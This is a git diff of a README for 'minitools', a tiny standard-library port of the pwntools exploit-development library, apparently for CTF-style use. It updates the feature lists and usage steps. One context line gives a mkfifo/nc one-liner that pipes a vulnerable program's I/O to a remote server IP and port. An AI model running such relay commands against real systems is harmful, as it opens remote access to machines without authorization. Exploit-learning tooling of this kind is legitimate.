@@ -1,11 +1,10 @@
 # minitools
-A minimal version of pwntools that only uses the standard library
+A portable, highly-compressed (~40KB) version of pwntools
 
 
 # PLEASE DON'T USE THIS IF YOU DON'T HAVE TO!!!
 I'f you've found this repository, I imagine it's because you want to use pwntools on a machine that has limited or no external internet access.
-This repository *can* work as a solution, but treat it as a final option-- this only contains the code for process communication and packing. No ELF parsing, no ROP generation etc etc.
-
+This repository *can* work as a solution, but treat it as a final option-- this is *very* hacky given that I'm trying to compress everything down so much.
 If you can connect to the machine over SSH, you're in luck. Ignore this repository:
 ```python
 conn = ssh('blah', 'server.com', password='password')
@@ -31,22 +30,28 @@ p = s.next_connection()
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|./vulnerable_program 2>&1|nc <your-server-ip> 8888 >/tmp/f
 ```
 
-If none of those work, or you need this for some other reason, then you can try my terrible solution.
-
+If none of these fit your use case, then you can give this a shot.
 # Usage
-You can download the maximally-compressed `.zip` from the 'Releases' tab, then use it like so:
+Running `create_minified.sh` will create a file `minitools.zip`. You can import this with `sys` and begin your exploit as usual:
 ```python
 import sys
 sys.path.insert(0, 'minitools.zip')
-from minitools import *
+from mini import *
+# continue exploit your exploit script as normal
 ```
+
 Minitools includes:
 - Most of `remote()` and `process()` (minus uncommon functions like `recvline_regex`)
 - Common packing functions (`u64`, `u32`, `p64`, `p32`, `flat` should also work)
 - `cyclic()` and `cyclic_find()`
+- Format string payload generation
+- Argument parsing
 - A mediocre implementation of logging
+- A mediocre ELF parser
+
+
 Minitools does not include:
-- ELF parsing (as it requires pyelftools)
-- ROP chain generation (as it requires capstone)
-- Format string payload generation (however I might add it later)
-- Argument parsing (see above)
+- Pwntools' 'gdb' module
+- ROP chain generation (I may attempt this later-- x86 only though)
+- Support for non-x86 architectures
+- The 'pwn' command-line tool
